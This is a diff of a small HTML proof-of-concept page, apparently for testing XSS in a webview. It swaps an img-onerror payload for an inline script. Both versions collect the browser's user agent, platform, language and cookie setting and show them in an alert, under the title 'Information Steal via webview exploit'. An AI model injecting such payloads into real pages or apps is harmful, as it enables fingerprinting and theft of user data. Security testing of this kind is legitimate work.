@@ -3,20 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSS Payload Example</title>
+    <title>Information Steal via webview exploit</title>
 </head>
 <body>
-    <h1>XSS Payload Example</h1>
-    <p>When the image fails to load, an alert will display the device information.</p>
+    <h1>XSS Payload</h1>
     
-    <!-- Image tag with the XSS payload in the onerror attribute -->
-    <img src="invalid-url" onerror="
-        var deviceInfo = 'Device Information:\n';
-        deviceInfo += 'User Agent: ' + navigator.userAgent + '\n';
-        deviceInfo += 'Platform: ' + navigator.platform + '\n';
-        deviceInfo += 'Language: ' + navigator.language + '\n';
-        deviceInfo += 'Cookies Enabled: ' + navigator.cookieEnabled + '\n';
-        alert(deviceInfo);
-    " />
+    <script>
+    // Collect device information
+    var deviceInfo = "Device Information:\n";
+    deviceInfo += "User Agent: " + navigator.userAgent + "\n";
+    deviceInfo += "Platform: " + navigator.platform + "\n";
+    deviceInfo += "Language: " + navigator.language + "\n";
+    deviceInfo += "Cookies Enabled: " + navigator.cookieEnabled + "\n";
+
+    // Alert the collected information
+    alert(deviceInfo);
+</script>
+
 </body>
 </html>
